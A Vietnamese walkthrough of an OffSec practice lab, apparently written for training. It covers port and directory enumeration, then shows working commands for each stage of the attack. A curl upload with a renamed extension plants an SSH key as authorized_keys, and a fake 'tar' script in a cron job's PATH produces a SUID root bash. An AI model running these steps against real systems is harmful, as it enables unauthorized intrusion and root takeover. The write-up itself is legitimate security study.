# Offsec Easy Lab Writeup: Enumeration và Privilege Escalation qua Crontab

## Mục tiêu

Lab này tập trung vào kỹ thuật enumeration và leo quyền (privilege escalation) thông qua crontab. Mục tiêu là lấy file `local.txt` và giành quyền root trên host.

## Bước 1: Enumeration

### Quét dịch vụ bằng Nmap

Sử dụng `nmap` để quét các port mở trên host mục tiêu:

```bash
nmap -sC -sV -p- <target_ip>
```

**Kết quả**:

- **Port 21**: Dịch vụ FTP, hỗ trợ đăng nhập `anonymous`.
- **Port 25022**: Dịch vụ SSH.
- **Port 33414**: Dịch vụ web.
- **Port 40080**: Dịch vụ web.

### Kiểm tra các port

1. **Port 21 (FTP)**:
    
    - Thử đăng nhập bằng `anonymous`:
        
        ```bash
        ftp <target_ip> 21
        ```
        
    - Kết quả: Có thể đăng nhập nhưng không thể tải file lên hoặc xuống. Tạm dừng hướng này.
2. **Port 33414 (Web)**:
    
    - Sử dụng `FFUF` để tìm các đường dẫn ẩn:
        
        ```bash
        ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target_ip>:33414/FUZZ
        ```
        
    - Kết quả: Tìm thấy các endpoint `/help` và `/info`.
    - Truy cập `/help` phát hiện hai endpoint quan trọng:
        - `/file-upload`: Cho phép upload file.
        - `/files`: Liệt kê các file trong thư mục.
3. **Port 40080 (Web)**:
    
    - Dùng `FFUF` để fuzz nhưng không tìm thấy đường dẫn ẩn nào đáng chú ý. Tạm dừng hướng này.

## Bước 2: Khai thác dịch vụ web (Port 33414)

### Kiểm tra endpoint `/files`

- Truy cập `/files` để liệt kê các file trong thư mục của user `alfredo`:
    - Phát hiện file `local.txt` (mục tiêu) và thư mục `.ssh`.
    - Giả định: Web server chạy dưới quyền user `alfredo`, có thể ghi file vào thư mục `.ssh`.

### Upload file vào thư mục `.ssh`

1. **Tạo SSH keypair**:
    
    ```bash
    ssh-keygen -t rsa -f id_rsa
    ```
    
    - Tạo file `id_rsa` (private key) và `id_rsa.pub` (public key).
2. **Thử upload file**:
    
    - Sử dụng `curl` để upload file `id_rsa.pub` vào thư mục `.ssh` với tên `authorized_keys`:
        
        ```bash
        curl -F "file=@id_rsa.pub" -F "filename=authorized_keys" http://<target_ip>:33414/file-upload
        ```
        
    - Kết quả: Thất bại do server chỉ cho phép các định dạng `.txt`, `.pdf`, `.png`, v.v.
3. **Bypass hạn chế định dạng**:
    
    - Đổi tên file `id_rsa.pub` thành `id_rsa.txt`:
        
        ```bash
        cp id_rsa.pub id_rsa.txt
        ```
        
    - Upload lại với tên `authorized_keys`:
        
        ```bash
        curl -F "file=@id_rsa.txt" -F "filename=authorized_keys" http://<target_ip>:33414/file-upload
        ```
        
    - Kết quả: Upload thành công.
4. **Đăng nhập SSH**:
    
    - Sử dụng private key để đăng nhập:
        
        ```bash
        ssh -i id_rsa alfredo@<target_ip> -p 25022
        ```
        
    - Kết quả: Đăng nhập thành công và lấy được file `local.txt`.

## Bước 3: Privilege Escalation

### Kiểm tra crontab

- Đọc file `/etc/crontab` để tìm các cronjob:
    
    ```bash
    cat /etc/crontab
    ```
    
- Kết quả: Phát hiện một script chạy với quyền root mỗi phút một lần:
    
    ```bash
    * * * * * root /home/alfredo/restapi/backup.sh
    ```
    

### Phân tích script `backup.sh`

- Đọc nội dung script:
    
    ```bash
    cat /home/alfredo/restapi/backup.sh
    ```
    
- Nội dung script sử dụng lệnh `tar` với wildcard (`*`) và export một đường dẫn vào `$PATH`:
    
    ```bash
    export PATH=/home/alfredo/restapi:$PATH
    tar -zcf /tmp/backup.tar.gz /home/alfredo/restapi/*
    ```
    

### Khai thác lỗ hổng `$PATH`

- Nhận thấy user `alfredo` có quyền ghi vào `/home/alfredo/restapi`. Có thể tạo file `tar` giả mạo để thay thế lệnh `tar` thật.
- Tạo script giả mạo `tar`:
    
    ```bash
    echo -e '#!/bin/sh\ncp /bin/bash /home/alfredo/rootbash\nchmod +4755 /home/alfredo/rootbash' > /home/alfredo/restapi/tar
    chmod +x /home/alfredo/restapi/tar
    ```
    
- Script này sao chép `/bin/bash` thành `rootbash` và thêm quyền SUID.

### Kết quả

- Sau khi chờ khoảng 1 phút, cronjob chạy và tạo file `/home/alfredo/rootbash` với quyền SUID.
- Chạy lệnh để lấy quyền root:
    
    ```bash
    /home/alfredo/rootbash -p
    ```
    
- Kết quả: Lấy được quyền root thành công.

## Bài học rút ra

1. **Enumeration kỹ lưỡng**: Quét toàn bộ port và kiểm tra từng dịch vụ là bước quan trọng để tìm điểm xâm nhập.
2. **Kiểm tra quyền truy cập**: Việc upload file vào thư mục `.ssh` cho thấy tầm quan trọng của việc kiểm tra quyền ghi trên các thư mục nhạy cảm.
3. **Hiểu cơ chế `$PATH`**: Lỗ hổng trong `$PATH` của cronjob có thể bị khai thác để thực thi lệnh giả mạo.
4. **Kiên trì thử nghiệm**: Thử bypass hạn chế upload bằng cách đổi đuôi file là cách tiếp cận sáng tạo và hiệu quả.